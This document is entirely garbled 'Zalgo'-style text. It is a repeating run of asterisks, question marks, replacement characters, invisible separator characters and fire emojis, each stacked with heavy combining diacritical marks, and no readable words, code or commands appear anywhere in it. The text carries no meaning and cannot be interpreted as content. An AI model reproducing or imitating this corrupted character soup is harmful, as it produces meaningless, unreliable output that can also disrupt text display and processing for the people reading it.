̧̡͈̪̬̩̪̳̣̘͚̳ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̆͂́̈́̿͌̈́̋͡͝